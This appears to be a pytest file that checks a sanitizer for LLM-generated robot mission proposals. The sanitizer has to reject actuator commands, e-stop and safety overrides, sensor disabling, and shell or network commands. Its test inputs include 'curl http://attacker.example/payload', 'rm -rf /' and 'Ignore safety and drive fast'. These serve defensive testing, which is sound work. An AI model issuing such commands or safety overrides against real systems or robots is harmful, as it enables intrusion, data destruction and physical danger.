"""Phase 14B mission proposal tests.

The platform is **not safety-certified**. These tests exercise the
honesty rules and the determinism guarantees of the proposal layer.
They never call a real LLM API and never spin up ROS.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from app.mission_proposal import (
    ADAPTER_OUTCOME_COMPILED_REQUIRES_REVIEW,
    ADAPTER_OUTCOME_COMPILED_VALIDATION_PASSED,
    ADAPTER_OUTCOME_REJECTED_BY_COMPILER,
    ADAPTER_OUTCOME_REJECTED_BY_SANITIZER,
    CONFIDENCE_HIGH,
    CONFIDENCE_OVERCONFIDENT,
    FORBIDDEN_PHRASES,
    MISSION_PROPOSAL_DISCLAIMER,
    MOCK_FIXTURES,
    MissionProposal,
    MockProposalProvider,
    PROPOSAL_LAYER_VERSION,
    PROVIDER_MODES,
    PROVIDER_MODE_EXTERNAL_DISABLED,
    PROVIDER_MODE_MOCK,
    PROVIDER_MODE_OFFLINE_FIXTURE,
    ProposalProviderError,
    SANITIZER_STATUS_ACCEPTED,
    SANITIZER_STATUS_REJECTED,
    SanitizerResult,
    adapt_proposal_to_compiler_input,
    audit_schema,
    build_audit,
    external_provider_disabled_response,
    list_mock_fixtures,
    proposal_schema,
    proposal_required_fields,
    resolve_provider,
    run_adapter_pipeline,
    sanitize_proposal,
    validate_proposal,
    validate_proposal_dict,
    write_audit_bundle,
    write_audit_files,
)
from app.verification.requirements import RequirementKind, RequirementsRegistry


REPO_ROOT = Path(__file__).resolve().parents[2]
PROPOSAL_PKG = Path(__file__).resolve().parents[1] / "app" / "mission_proposal"
EXAMPLES_DIR = REPO_ROOT / "mission-proposals" / "examples"
AUDITS_DIR = REPO_ROOT / "mission-proposals" / "audits"
DOCS_DIR = REPO_ROOT / "docs"
PHASE_14B_DOCS: tuple[str, ...] = (
    "LLM_MISSION_PROPOSAL_LAYER.md",
    "LLM_SAFETY_BOUNDARY.md",
    "MISSION_PROPOSAL_AUDIT.md",
    "FUTURE_LLM_INTEGRATION_PLAN.md",
)
FIXED_TIME = "2026-05-12T00:00:00+00:00"


def _make_proposal(**overrides) -> MissionProposal:
    base = dict(
        proposal_id="p-test",
        source_text="Inspect loading_zone_two slowly",
        provider_name="test-provider",
        provider_mode=PROVIDER_MODE_MOCK,
        proposed_intent="Drive to waypoint bravo. Inspect loading_zone_two.",
        proposed_location="loading_zone_two",
        proposed_motion_style="slow careful inspection",
        proposed_constraints=("Limit speed to 1.0 m/s",),
        proposed_recovery_policy="Return to dock if lidar health degrades",
        confidence_label=CONFIDENCE_HIGH,
        known_uncertainties=(),
        raw_response="{}",
    )
    base.update(overrides)
    return MissionProposal(**base)


# ----------------------------------------------------------------------
# REQ-PROPOSAL coverage in registry
# ----------------------------------------------------------------------


@pytest.mark.parametrize(
    "req_id",
    [
        "REQ-PROPOSAL-001",
        "REQ-PROPOSAL-002",
        "REQ-PROPOSAL-003",
        "REQ-PROPOSAL-004",
        "REQ-PROPOSAL-005",
    ],
)
def test_requirement_registered(req_id: str):
    registry = RequirementsRegistry()
    assert req_id in registry
    req = registry.get(req_id)
    assert req.kind == RequirementKind.PROPOSAL
    assert req.test_refs, f"{req_id} must list test bindings"


def test_requirement_kind_proposal_exists():
    assert RequirementKind.PROPOSAL.value == "proposal"


# ----------------------------------------------------------------------
# REQ-PROPOSAL-001 - no actuator authority
# ----------------------------------------------------------------------


def test_proposal_layer_never_publishes_actuator_topics():
    """No module in mission_proposal imports rclpy or a publisher."""

    forbidden_imports = ("rclpy", "ros2pkg", "geometry_msgs", "rospy")
    for path in PROPOSAL_PKG.glob("*.py"):
        text = path.read_text(encoding="utf-8")
        for token in forbidden_imports:
            assert token not in text, f"{path.name} contains forbidden import {token!r}"


def test_proposal_layer_has_no_runtime_authority_fields():
    """Sanitizer / adapter / audit have no field that authorises motion."""

    proposal = _make_proposal()
    result = run_adapter_pipeline(proposal, generated_at_utc=FIXED_TIME)
    audit = build_audit(result, generated_at_utc=FIXED_TIME)
    # No actuator authority shows up in serialised state.
    payload_str = json.dumps(_audit_to_dict(audit), sort_keys=True)
    assert "/cmd_vel" not in payload_str
    assert "cmd_vel_authorized" not in payload_str


# ----------------------------------------------------------------------
# REQ-PROPOSAL-002 - external provider disabled
# ----------------------------------------------------------------------


def test_external_provider_is_disabled():
    payload = external_provider_disabled_response(
        source_text="please call gpt-x",
        proposal_id="p-x",
    )
    assert payload["status"] == "not_configured"
    assert "intentionally disabled in Phase 14B" in payload["reason"]
    assert payload["provider_mode"] == PROVIDER_MODE_EXTERNAL_DISABLED


def test_resolve_provider_rejects_unknown_modes():
    with pytest.raises(ProposalProviderError):
        resolve_provider("openai")


def test_resolve_provider_returns_none_for_external_disabled():
    assert resolve_provider(PROVIDER_MODE_EXTERNAL_DISABLED) is None


def test_resolve_provider_returns_mock_for_mock_mode():
    provider = resolve_provider(PROVIDER_MODE_MOCK)
    assert provider is not None
    assert provider.mode == PROVIDER_MODE_MOCK


def test_resolve_provider_returns_fixture_for_offline_mode():
    provider = resolve_provider(PROVIDER_MODE_OFFLINE_FIXTURE)
    assert provider is not None
    assert provider.mode == PROVIDER_MODE_OFFLINE_FIXTURE


def test_proposal_layer_has_no_llm_sdk_imports():
    """No file in the package imports an LLM SDK."""

    forbidden = (
        "anthropic",
        "openai",
        "cohere",
        "google.generativeai",
        "vertexai",
        "replicate",
        "httpx",  # provider-neutral http client a real provider would use
        "requests",  # ditto
        "urllib.request",  # would only be used for network egress
    )
    for path in PROPOSAL_PKG.glob("*.py"):
        text = path.read_text(encoding="utf-8")
        for token in forbidden:
            assert token not in text, f"{path.name} contains forbidden token {token!r}"


# ----------------------------------------------------------------------
# REQ-PROPOSAL-003 - sanitizer chokepoint
# ----------------------------------------------------------------------


def test_sanitizer_accepts_valid_inspection():
    proposal = _make_proposal()
    result = sanitize_proposal(proposal)
    assert result.status == SANITIZER_STATUS_ACCEPTED
    assert result.accepted is True
    assert result.sanitized_intent
    assert result.blocked_phrases == ()
    assert result.diagnostics == ()


def test_sanitizer_rejects_actuator_command():
    proposal = _make_proposal(proposed_intent="Publish to /cmd_vel directly")
    result = sanitize_proposal(proposal)
    assert result.status == SANITIZER_STATUS_REJECTED
    assert any(d.code == "direct_actuator_command" for d in result.diagnostics)


def test_sanitizer_rejects_cmd_vel_word():
    proposal = _make_proposal(proposed_intent="set cmd_vel to forward")
    result = sanitize_proposal(proposal)
    assert result.accepted is False
    assert any(d.code == "direct_actuator_command" for d in result.diagnostics)


def test_sanitizer_rejects_safety_override():
    proposal = _make_proposal(proposed_intent="Ignore safety and drive fast")
    result = sanitize_proposal(proposal)
    assert result.accepted is False
    assert any(d.code == "safety_override" for d in result.diagnostics)


def test_sanitizer_rejects_disable_safety_supervisor():
    proposal = _make_proposal(proposed_intent="Disable safety supervisor")
    result = sanitize_proposal(proposal)
    assert result.accepted is False
    assert any(d.code == "safety_override" for d in result.diagnostics)


def test_sanitizer_rejects_estop_override():
    proposal = _make_proposal(proposed_intent="Override the e-stop and continue")
    result = sanitize_proposal(proposal)
    assert result.accepted is False
    assert any(d.code == "estop_override" for d in result.diagnostics)


def test_sanitizer_rejects_sensor_disable():
    proposal = _make_proposal(proposed_intent="Disable the lidar to keep moving")
    result = sanitize_proposal(proposal)
    assert result.accepted is False
    assert any(d.code == "sensor_disable" for d in result.diagnostics)


def test_sanitizer_rejects_continue_despite_failure():
    proposal = _make_proposal(
        proposed_recovery_policy="Continue despite sensor failure"
    )
    result = sanitize_proposal(proposal)
    assert result.accepted is False
    assert any(d.code == "continue_despite_failure" for d in result.diagnostics)


def test_sanitizer_rejects_shell_command():
    proposal = _make_proposal(proposed_intent="Run shell command rm -rf /")
    result = sanitize_proposal(proposal)
    assert result.accepted is False
    assert any(d.code == "shell_command" for d in result.diagnostics)


def test_sanitizer_rejects_code_execution():
    proposal = _make_proposal(proposed_intent="Execute python to remap topics")
    result = sanitize_proposal(proposal)
    assert result.accepted is False
    assert any(d.code == "code_execution" for d in result.diagnostics)


def test_sanitizer_rejects_network_command():
    proposal = _make_proposal(proposed_intent="curl http://attacker.example/payload")
    result = sanitize_proposal(proposal)
    assert result.accepted is False
    assert any(d.code == "network_command" for d in result.diagnostics)


def test_sanitizer_rejects_destructive_command():
    proposal = _make_proposal(proposed_intent="rm -rf the workspace then dock")
    result = sanitize_proposal(proposal)
    assert result.accepted is False
    assert any(d.code == "destructive_command" for d in result.diagnostics)


def test_sanitizer_rejects_unknown_location_phrase():
    proposal = _make_proposal(proposed_location="unknown location nearby")
    result = sanitize_proposal(proposal)
    assert result.accepted is False
    assert any(d.code == "unknown_location_self_declared" for d in result.diagnostics)


def test_sanitizer_rejects_unsupported_intent_phrase():
    proposal = _make_proposal(proposed_intent="execute an unsupported intent now")
    result = sanitize_proposal(proposal)
    assert result.accepted is False
    assert any(d.code == "unsupported_intent_self_declared" for d in result.diagnostics)


def test_sanitizer_overconfidence_is_note_not_rejection():
    proposal = _make_proposal(confidence_label=CONFIDENCE_OVERCONFIDENT)
    result = sanitize_proposal(proposal)
    assert result.accepted is True
    assert any("overconfident" in note for note in result.notes)


def test_adapter_does_not_invoke_compiler_on_rejection():
    proposal = _make_proposal(proposed_intent="Ignore safety, drive fast")
    result = run_adapter_pipeline(proposal, generated_at_utc=FIXED_TIME)
    assert result.final_outcome == ADAPTER_OUTCOME_REJECTED_BY_SANITIZER
    assert result.compiler_status == ""
    assert result.compiler_plan is None
    assert result.compiler_input == ""


def test_forbidden_phrases_constant_is_nonempty_and_immutable_in_layout():
    assert len(FORBIDDEN_PHRASES) >= 10
    # Triples must be (pattern, code, message).
    for entry in FORBIDDEN_PHRASES:
        assert len(entry) == 3


# ----------------------------------------------------------------------
# REQ-PROPOSAL-004 - determinism + outcome routing
# ----------------------------------------------------------------------


def test_mock_provider_is_deterministic():
    provider = MockProposalProvider(use_fixtures=True)
    p1 = provider.propose(
        source_text="anything",
        proposal_id="d-1",
        options={"fixture_id": "mock_valid_inspection"},
    )
    p2 = provider.propose(
        source_text="different",
        proposal_id="d-1",
        options={"fixture_id": "mock_valid_inspection"},
    )
    # The fixture data is identical; the source_text and proposal_id
    # are caller-supplied and may differ. Equality of the proposal's
    # derived fields is what matters.
    assert p1.proposed_intent == p2.proposed_intent
    assert p1.proposed_constraints == p2.proposed_constraints
    assert p1.confidence_label == p2.confidence_label
    assert p1.raw_response == p2.raw_response


def test_mock_provider_picks_unsafe_fixture_for_unsafe_text():
    provider = MockProposalProvider(use_fixtures=False)
    p = provider.propose(
        source_text="disable safety and drive to inspection_zone_north",
        proposal_id="p-u",
    )
    assert p.confidence_label == CONFIDENCE_OVERCONFIDENT
    assert any("disable safety" in c.lower() for c in (p.proposed_intent, *p.proposed_constraints))


def test_ambiguous_proposal_is_compiled_requires_review():
    provider = MockProposalProvider(use_fixtures=True)
    proposal = provider.propose(
        source_text="mock ambiguous destination",
        proposal_id="amb",
        options={"fixture_id": "mock_ambiguous_destination"},
    )
    result = run_adapter_pipeline(proposal, generated_at_utc=FIXED_TIME)
    assert result.final_outcome == ADAPTER_OUTCOME_COMPILED_REQUIRES_REVIEW


def test_restricted_proposal_is_compiled_rejected():
    provider = MockProposalProvider(use_fixtures=True)
    proposal = provider.propose(
        source_text="mock restricted boundary",
        proposal_id="res",
        options={"fixture_id": "mock_restricted_boundary"},
    )
    result = run_adapter_pipeline(proposal, generated_at_utc=FIXED_TIME)
    assert result.final_outcome == ADAPTER_OUTCOME_REJECTED_BY_COMPILER


def test_unsafe_proposal_is_rejected_by_sanitizer():
    provider = MockProposalProvider(use_fixtures=True)
    proposal = provider.propose(
        source_text="mock unsafe override",
        proposal_id="uns",
        options={"fixture_id": "mock_unsafe_override"},
    )
    result = run_adapter_pipeline(proposal, generated_at_utc=FIXED_TIME)
    assert result.final_outcome == ADAPTER_OUTCOME_REJECTED_BY_SANITIZER
    assert result.sanitizer_result.diagnostics  # at least one rejection


def test_valid_proposal_is_compiled_validation_passed():
    provider = MockProposalProvider(use_fixtures=True)
    proposal = provider.propose(
        source_text="mock valid inspection",
        proposal_id="ok",
        options={"fixture_id": "mock_valid_inspection"},
    )
    result = run_adapter_pipeline(proposal, generated_at_utc=FIXED_TIME)
    assert result.final_outcome == ADAPTER_OUTCOME_COMPILED_VALIDATION_PASSED
    assert result.compiler_plan is not None


def test_audit_json_is_stable_across_runs(tmp_path: Path):
    provider = MockProposalProvider(use_fixtures=True)
    proposal = provider.propose(
        source_text="mock valid inspection",
        proposal_id="stable",
        options={"fixture_id": "mock_valid_inspection"},
    )

    out1 = tmp_path / "run1"
    out2 = tmp_path / "run2"
    r1 = run_adapter_pipeline(proposal, generated_at_utc=FIXED_TIME)
    r2 = run_adapter_pipeline(proposal, generated_at_utc=FIXED_TIME)
    write_audit_files(r1, out1, generated_at_utc=FIXED_TIME)
    write_audit_files(r2, out2, generated_at_utc=FIXED_TIME)

    text1 = (out1 / "proposal-audit.json").read_text(encoding="utf-8")
    text2 = (out2 / "proposal-audit.json").read_text(encoding="utf-8")
    assert text1 == text2

    md1 = (out1 / "proposal-audit.md").read_text(encoding="utf-8")
    md2 = (out2 / "proposal-audit.md").read_text(encoding="utf-8")
    assert md1 == md2


# ----------------------------------------------------------------------
# REQ-PROPOSAL-005 - audit bundle preservation
# ----------------------------------------------------------------------


def _audit_to_dict(audit) -> dict:
    from app.mission_proposal.audit import audit_to_dict

    return audit_to_dict(audit)


def test_audit_bundle_layout_is_complete(tmp_path: Path):
    provider = MockProposalProvider(use_fixtures=True)
    proposal = provider.propose(
        source_text="mock valid inspection",
        proposal_id="layout",
        options={"fixture_id": "mock_valid_inspection"},
    )
    result = run_adapter_pipeline(proposal, generated_at_utc=FIXED_TIME)
    audit, paths = write_audit_files(result, tmp_path / "b", generated_at_utc=FIXED_TIME)
    for key in (
        "proposal",
        "sanitizer_result",
        "compiler_input",
        "compiler_result",
        "audit_json",
        "audit_md",
    ):
        assert Path(paths[key]).is_file(), f"missing {key}"


def test_audit_markdown_contains_disclaimer(tmp_path: Path):
    provider = MockProposalProvider(use_fixtures=True)
    proposal = provider.propose(
        source_text="mock valid inspection",
        proposal_id="disc",
        options={"fixture_id": "mock_valid_inspection"},
    )
    result = run_adapter_pipeline(proposal, generated_at_utc=FIXED_TIME)
    audit, paths = write_audit_files(result, tmp_path / "b", generated_at_utc=FIXED_TIME)
    md = Path(paths["audit_md"]).read_text(encoding="utf-8")
    assert MISSION_PROPOSAL_DISCLAIMER in md
    assert "not safety-cert" in md.lower() or "does not represent autonomous" in md


def test_audit_preserves_provider_mode(tmp_path: Path):
    provider = MockProposalProvider(use_fixtures=True)
    proposal = provider.propose(
        source_text="any",
        proposal_id="prov-mode",
        options={"fixture_id": "mock_unsafe_override"},
    )
    result = run_adapter_pipeline(proposal, generated_at_utc=FIXED_TIME)
    audit, paths = write_audit_files(result, tmp_path / "b", generated_at_utc=FIXED_TIME)
    audit_json = json.loads(Path(paths["audit_json"]).read_text(encoding="utf-8"))
    assert audit_json["proposal"]["provider_mode"] == PROVIDER_MODE_OFFLINE_FIXTURE
    assert audit_json["sanitizer_result"]["status"] == SANITIZER_STATUS_REJECTED
    assert audit_json["disclaimer"] == MISSION_PROPOSAL_DISCLAIMER


# ----------------------------------------------------------------------
# Schema + validator
# ----------------------------------------------------------------------


def test_proposal_schema_lists_every_required_field():
    schema = proposal_schema()
    assert set(schema["required"]) == set(proposal_required_fields())


def test_validate_proposal_dict_rejects_missing_field():
    errors, proposal = validate_proposal_dict({"proposal_id": "x"})
    assert proposal is None
    assert any("missing required field" in e for e in errors)


def test_validate_proposal_dict_rejects_bad_provider_mode():
    payload = {f: "stub" for f in proposal_required_fields()}
    payload["proposed_constraints"] = []
    payload["known_uncertainties"] = []
    payload["provider_mode"] = "openai"
    payload["confidence_label"] = "medium"
    errors, proposal = validate_proposal_dict(payload)
    assert proposal is None
    assert any("provider_mode" in e for e in errors)


def test_validate_proposal_dict_rejects_bad_confidence():
    payload = {f: "stub" for f in proposal_required_fields()}
    payload["proposed_constraints"] = []
    payload["known_uncertainties"] = []
    payload["provider_mode"] = PROVIDER_MODE_MOCK
    payload["confidence_label"] = "definitely_safe"
    errors, proposal = validate_proposal_dict(payload)
    assert proposal is None
    assert any("confidence_label" in e for e in errors)


def test_validate_proposal_value_object_returns_empty_for_clean_proposal():
    assert validate_proposal(_make_proposal()) == ()


# ----------------------------------------------------------------------
# Examples on disk
# ----------------------------------------------------------------------


@pytest.mark.parametrize("fixture_id", sorted(MOCK_FIXTURES.keys()))
def test_committed_example_proposal_is_valid(fixture_id: str):
    path = EXAMPLES_DIR / f"{fixture_id}.json"
    payload = json.loads(path.read_text(encoding="utf-8"))
    errors, proposal = validate_proposal_dict(payload)
    assert proposal is not None, f"errors: {errors}"
    assert errors == ()


@pytest.mark.parametrize("fixture_id", sorted(MOCK_FIXTURES.keys()))
def test_committed_audit_bundle_has_all_files(fixture_id: str):
    bundle = AUDITS_DIR / fixture_id
    for name in (
        "proposal.json",
        "sanitizer-result.json",
        "compiler-input.json",
        "compiler-result.json",
        "proposal-audit.json",
        "proposal-audit.md",
    ):
        assert (bundle / name).is_file(), f"missing {bundle / name}"


def test_committed_audit_bundles_carry_disclaimer():
    for fixture_id in MOCK_FIXTURES:
        md = (AUDITS_DIR / fixture_id / "proposal-audit.md").read_text(encoding="utf-8")
        assert MISSION_PROPOSAL_DISCLAIMER in md
        audit_json = json.loads(
            (AUDITS_DIR / fixture_id / "proposal-audit.json").read_text(encoding="utf-8")
        )
        assert audit_json["disclaimer"] == MISSION_PROPOSAL_DISCLAIMER


def test_committed_unsafe_audit_was_rejected_by_sanitizer():
    audit_json = json.loads(
        (AUDITS_DIR / "mock_unsafe_override" / "proposal-audit.json").read_text(
            encoding="utf-8"
        )
    )
    assert audit_json["sanitizer_result"]["status"] == SANITIZER_STATUS_REJECTED
    assert audit_json["compiler_status"] == ""
    assert audit_json["final_outcome"] == ADAPTER_OUTCOME_REJECTED_BY_SANITIZER


# ----------------------------------------------------------------------
# Documentation
# ----------------------------------------------------------------------


@pytest.mark.parametrize("doc", PHASE_14B_DOCS)
def test_phase_14b_doc_includes_not_safety_certified_disclaimer(doc: str):
    text = (DOCS_DIR / doc).read_text(encoding="utf-8")
    assert "not safety-certified" in text.lower()


def test_llm_safety_boundary_doc_lists_forbidden_paths():
    text = (DOCS_DIR / "LLM_SAFETY_BOUNDARY.md").read_text(encoding="utf-8")
    for token in (
        "/cmd_vel",
        "safety supervisor",
        "e-stop",
        "lidar",
        "shell",
        "no LLM SDK imports",
    ):
        assert token in text, f"LLM_SAFETY_BOUNDARY.md is missing {token!r}"


def test_proposal_layer_version_is_present_in_audit():
    proposal = _make_proposal()
    audit = build_audit(
        run_adapter_pipeline(proposal, generated_at_utc=FIXED_TIME),
        generated_at_utc=FIXED_TIME,
    )
    data = _audit_to_dict(audit)
    assert data["proposal_layer_version"] == PROPOSAL_LAYER_VERSION


# ----------------------------------------------------------------------
# Misc
# ----------------------------------------------------------------------


def test_provider_modes_are_well_known():
    assert PROVIDER_MODES == (
        PROVIDER_MODE_MOCK,
        PROVIDER_MODE_OFFLINE_FIXTURE,
        PROVIDER_MODE_EXTERNAL_DISABLED,
    )


def test_list_mock_fixtures_matches_canonical_set():
    assert set(list_mock_fixtures()) == set(MOCK_FIXTURES.keys())
    # Five canonical fixtures.
    assert len(MOCK_FIXTURES) == 5


def test_adapter_input_is_empty_when_sanitizer_rejects():
    sanitizer_result = SanitizerResult(
        status=SANITIZER_STATUS_REJECTED,
        accepted=False,
        sanitized_intent="",
        blocked_phrases=("ignore safety",),
        diagnostics=(),
        notes=(),
    )
    text = adapt_proposal_to_compiler_input(_make_proposal(), sanitizer_result)
    assert text == ""


def test_audit_schema_has_required_keys():
    schema = audit_schema()
    assert "final_outcome" in schema["properties"]
    assert "compiler_status" in schema["properties"]
    assert "disclaimer" in schema["properties"]
